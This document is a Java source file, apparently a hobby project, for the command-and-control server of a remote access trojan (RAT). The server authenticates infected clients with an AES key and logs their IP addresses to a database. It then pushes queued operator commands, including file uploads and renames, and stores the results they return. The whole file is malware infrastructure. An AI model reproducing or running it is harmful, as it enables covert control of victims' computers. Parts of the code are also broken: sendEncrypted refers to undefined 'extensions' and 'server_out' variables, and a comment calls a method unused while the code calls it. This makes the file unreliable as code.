import java.io.OutputStreamWriter;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.RandomAccessFile;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;

import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.TimeZone;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;

import AES.AESInput;
import AES.Driver;
import DB.Database;

/**
 * Code to listen and connect to RAT clients over a specified port. Runs on
 * threads to allow for multiple concurrent clients.
 * 
 * @author Aidan Sprague
 * @author Raul Puza
 * @version 07.12.2021
 */
public class ClientServer {

    // ClientServer data fields:
    private static RandomAccessFile log;
    private static SimpleDateFormat formatter; // [yyyy-MM-dd HH:mm:ss]
    private static String key;
    private static String normKey;
    private static Database db;
    private static final String FILEPATH = "/home/admin/Server/"; // location of server files

    /**
     * Starts the client server.
     */
    public static void main(String[] args) {

        // Validate command line arguments
        if (args.length != 2) {
            System.out.println("Invocation: java ClientServer <Port #> " + "<Maximum # of Connections>");
            System.exit(1);
        }

        // Extract the arguments
        int port = Integer.parseInt(args[0]);
        int threads = Integer.parseInt(args[1]);

        // Start up the server
        try {
            new ClientServer(port, threads);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Creates a new ClientServer object which will run indefinitely, accepting
     * connections on a specified port and allowing a maximum of numThreads
     * connections.
     * 
     * @param port       the port number to listen for connections
     * @param numThreads the maximum number of connections
     * 
     * @throws IOException           if a connection issue occurs
     * @throws FileNotFoundException if a file cannot be accessed
     */
    public ClientServer(int port, int numThreads) throws IOException, FileNotFoundException {

        // Open relevant files
        log = new RandomAccessFile(FILEPATH + "Logs/client-log.txt", "rws");
        log.seek(log.length());
        db = new Database(FILEPATH + "Data/clients.db");

        formatter = new SimpleDateFormat("'['yyyy-MM-dd HH:mm:ss']'");

        // Open and store the key
        RandomAccessFile keyFile = new RandomAccessFile(FILEPATH + "Data/accesskey.txt", "r");
        key = keyFile.readLine();
        keyFile.close();

        // Ensure key is exactly 32 bytes
        normKey = key;
        key = Driver.textToHex(key);
        while (key.length() < 64)
            key += "00";

        if (key.length() > 64)
            key = key.substring(0, 64);

        // Open a connection on the specified port for listening
        @SuppressWarnings("resource")
        ServerSocket serverSocket = new ServerSocket(port);
        ExecutorService pool = Executors.newFixedThreadPool(numThreads);

        // Log starting information
        log.seek(log.length());
        log.writeBytes(getTime() + " Connection Opened (port " + port + ")\n");

        // Add shutdown conditions
        Runtime.getRuntime().addShutdownHook(new Thread() {
            public void run() {
                try {
                    Thread.sleep(200);
                    log.seek(log.length());
                    log.writeBytes(getTime() + " Connection Closed\n");
                    log.writeBytes("----------------------------------------\n");
                    log.close();
                } catch (Exception e) {
                    Thread.currentThread().interrupt();
                    e.printStackTrace();
                }
            }
        });

        // Listen for connections indefinitely
        while (true)
            pool.execute(new ServerThread(serverSocket.accept()));
    }

    /**
     * Returns a String representation of the current system time, of the form:
     * 
     * [yyyy-MM-dd HH:mm:ss]
     */
    private static String getTime() {
        Date date = new Date(System.currentTimeMillis());
        return formatter.format(date);
    }

    // --------------------------------------------------------------------- //

    /**
     * Private inner class to act as the individual server threads.
     */
    private static class ServerThread implements Runnable {

        // ServerThread data fields:
        private Socket socket;
        private BufferedReader client_in;
        private PrintWriter client_out;

        /**
         * Creates a new ServerThread object using a supplied socket object as its
         * connection.
         * 
         * @param socket the socket to communicate with
         */
        ServerThread(Socket socket) {
            this.socket = socket;
        }

        /**
         * This method is called when a new thread is created. It contains the logic of
         * how the server handles the RAT client.
         */
        @Override
        public void run() {
            try {
                // Set UTC Timezone
                TimeZone.setDefault(TimeZone.getTimeZone("UTC"));
                String newName = null;

                // Log who connected
                log.seek(log.length());
                log.writeBytes(getTime() + "\tConnected: " + socket + "\n");

                // Create I/O buffers
                client_in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                client_out = new PrintWriter(new OutputStreamWriter(socket.getOutputStream()), true);

                // Encrypt and modify the key
                String encKey = Driver.encryptKey(normKey);

                // Send hidden key
                client_out.println(encKey);

                // Validate the key from the client
                String response = receiveDecrypted();
                if (response == null || !response.equals("key")) {

                    // Send negative verification result
                    sendEncrypted("400 ERROR: invalid key");
                    socket.close();

                    // Log result
                    log.seek(log.length());
                    log.writeBytes(getTime() + "\t\tSocket sent invalid key\n");
                    log.writeBytes(getTime() + "\tClosed: " + socket + "\n");

                    // Break from the rest of the method
                    return;
                }

                // Send positive verification result
                sendEncrypted("200 Key Accepted");

                // Log result
                log.seek(log.length());
                log.writeBytes(getTime() + "\t\tKey Accepted\n");

                // Receive client identification
                response = receiveDecrypted();
                if (response == null) {

                    // Send error message
                    sendEncrypted("405 ERROR: invalid response");
                    socket.close();

                    // Log results
                    log.seek(log.length());
                    log.writeBytes(getTime() + "\t\tSocket sent invalid response\n");
                    log.writeBytes(getTime() + "\tClosed: " + socket + "\n");

                    // Break from the rest of the method
                    return;
                }

                String[] client_info = response.split("\\|");
                String client_id = client_info[0];
                db.updateClient(client_info, socket.getInetAddress().toString(), System.currentTimeMillis());

                // Get the commands for the client
                ArrayList<String> cmds = db.getCommands(client_id);
                ArrayList<String> rpts = db.getRepeats(client_id);

                // Check if there are any commands to be done
                if (cmds.size() + rpts.size() == 0) {

                    // Send empty message
                    sendEncrypted("[No Cmds]");

                    // Log results
                    log.seek(log.length());
                    log.writeBytes(getTime() + "\t\tNo commands to send\n");
                }

                else {

                    // Send list of commands
                    String commands = "";
                    String append = "";
                    for (String rpt : rpts) {
                        if (rpt.startsWith("upload")) {
                            append += (rpt + "|");
                        }
                        else {
                            commands += (rpt + "|");
                        }
                        if (rpt.startsWith("name"))
                            newName = rpt.substring(5);
                    }

                    for (String cmd : cmds) {
                        if (cmd.startsWith("upload")) {
                            append += (cmd + "|");
                        }
                        else {
                            commands += (cmd + "|");
                        }
                        if (cmd.startsWith("name"))
                            newName = cmd.substring(5);
                    }

                    sendEncrypted(commands);

                    // Clear command file
                    db.removeAllCommands(client_id);

                    // Log results
                    log.seek(log.length());
                    log.writeBytes(getTime() + "\t\tCommands sent\n");

                    // Receive command results
                    String[] splitCommands = commands.split("\\|");
                    for (int i = 0; i < splitCommands.length; i++) {

                        response = client_in.readLine();
                        if (response == null) {
                            log.seek(log.length());
                            log.writeBytes(getTime() + "\t\tError receiving results\n");
                            sendEncrypted("430 Null Response");
                        } 
                        else {
                            db.addResult(client_id, System.currentTimeMillis(), splitCommands[i], response, key);
                            log.seek(log.length());
                            log.writeBytes(getTime() + "\t\tResults received [3]\n");
                            sendEncrypted("200 Ok");
                        }
                    }
                }

                // Terminate the connection
                socket.close();

                if (newName != null)
                    db.changeName(client_id, newName);

                // Log results
                log.seek(log.length());
                log.writeBytes(getTime() + "\tClosed: " + socket + "\n");
            } catch (SocketException e) {
                try {
                    log.seek(log.length());
                    log.writeBytes(getTime() + "\t\tClient terminated connection\n");
                    log.writeBytes(getTime() + "\tClosed: " + socket + "\n");
                } catch (Exception f) {
                    f.printStackTrace();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        /**
         * Encrypts plaintext to ciphertext.
         */
        private String encrypt(String str) {
            AESInput input = new AESInput(str, key, true);
            return Driver.run(input);
        }

        /**
         * Decrypts ciphertext to plaintext.
         */
        private String decrypt(String str) {
            AESInput input = new AESInput(str, key, false);
            return Driver.run(input);
        }

        /**
         * Encrypts input before being sent to the operator.
         * 
         * upload = FA4
         * 
         * @param str   the string to encrypt and send
         */
        private static void sendEncrypted(String str) {
            // Deal with upload case
            String uploadString = "";
            if(str.contains("upload ")) {
                String[] cmds = str.split("\\|");
                int curr = 0;
                boolean anyOtherCommands = false;
                for(int i = cmds.length - 1; i >= 0; i--) {
                    if(cmds[i].startsWith("upload")) {
                        String upl = "FA4";
                        String[] tempSplit = cmds[i].split(" ");
                        cmds[i] = upl + extensions.get(tempSplit[1].split("\\.")[1]) + tempSplit[2];
                    }
                    else {
                        curr = i;
                        anyOtherCommands = true;
                        break;
                    }
                }
                // Store everything back in str except upload commands
                if(anyOtherCommands) {
                    str = "|";
                    for(int i = 0; i <= curr; i++) {
                        str += cmds[i] + "|";
                    }
                }
                else {
                    str = "";
                }
                // Store encrypted upload commands separately
                if(anyOtherCommands) {
                    curr++;
                }
                for(int i = curr; i < cmds.length; i++) {
                    uploadString += cmds[i] + "|";
                }
            }
            String encrypted = "";
            if(!str.equals("")) {
                AESInput input = new AESInput(str, key, true);
                encrypted = Driver.run(input) + uploadString;
            }
            else {
                encrypted = uploadString;
            }
            server_out.println(encrypted);
        }

        /**
         * Receives and decrypts a message from the client. Currently not in use until
         * Client.c has the capability to encrypt messages.
         * 
         * @return a decrypted string from the client
         */
        private String receiveDecrypted() throws Exception {
            String rec = client_in.readLine();
            if (rec == null)
                return null;

            return decrypt(rec);
        }
    }
}
